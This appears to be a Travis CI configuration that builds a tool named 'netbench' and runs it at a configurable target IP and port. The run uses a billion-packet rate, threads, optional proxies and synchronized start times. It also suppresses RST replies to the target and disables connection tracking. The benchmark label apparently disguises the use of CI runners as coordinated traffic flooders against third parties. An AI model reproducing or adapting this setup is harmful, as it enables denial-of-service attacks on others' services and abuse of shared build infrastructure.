language: c
os: linux
dist: focal
compiler: gcc

branches:
  only:
    - master
    - main

cache:
  directories:
    - $HOME/apt-cache

before_install:
  - |
    if [ -d ~/apt-cache ]; then
      sudo cp ~/apt-cache/*.deb /var/cache/apt/archives/ 2>/dev/null || true
    fi
    sudo apt-get update -qq > /dev/null 2>&1 || true
    sudo apt-get install -y libssl-dev cpulimit > /dev/null 2>&1 || true
    mkdir -p ~/apt-cache
    cp /var/cache/apt/archives/*.deb ~/apt-cache/ 2>/dev/null || true

script:
  - |
    # Build
    gcc -O3 -Wall -pthread -DNO_AF_XDP -c main.c -o main.o
    gcc -O3 -Wall -pthread -DNO_AF_XDP -c network.c -o network.o
    gcc -O3 -Wall -pthread -DNO_AF_XDP -c proxy.c -o proxy.o
    gcc -O3 -Wall -pthread -DNO_AF_XDP -c benchmark.c -o benchmark.o
    gcc -O3 -Wall -pthread -DNO_AF_XDP -o netbench main.o network.o proxy.o benchmark.o -lssl -lcrypto -lz
    echo "BUILD_OK"

    # Sysctl tuning
    sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
    sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
    sudo sysctl -w net.core.wmem_default=4194304 2>/dev/null || true
    sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
    sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
    sudo sysctl -w net.ipv4.conf.all.rp_filter=0 2>/dev/null || true
    sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
    sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
    sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true

    TARGET_IP="${TARGET_IP:-127.0.0.1}"
    TARGET_PORT="${TARGET_PORT:-443}"
    RATE="${RATE:-1000000000}"
    DURATION="${DURATION:-5}"
    METHOD="${METHOD:-v18_tcp}"
    THREADS="${THREADS:-4}"

    PROXY_FLAG="--no-proxies"
    if [ "$USE_PROXY" = "true" ]; then
      PROXY_FLAG=""
    fi

    if [ "$TARGET_IP" != "127.0.0.1" ]; then
      sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d "$TARGET_IP" -j DROP 2>/dev/null || true
    fi

    # Sync wait
    START_TS="${START_TIMESTAMP:-0}"
    if [ "$START_TS" != "0" ] && [ "$START_TS" != "" ]; then
      NOW=$(date +%s)
      WAIT=$((START_TS - NOW))
      if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
        sleep "$WAIT"
      fi
    fi

    ulimit -n 1000000 2>/dev/null || ulimit -n 65535 || true
    chmod +x netbench
    sudo sh -c "cpulimit -l 90 -f -- ./netbench $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./netbench $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"

after_script:
  - |
    if [ "$TARGET_IP" != "127.0.0.1" ]; then
      sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -d "$TARGET_IP" -j DROP 2>/dev/null || true
    fi
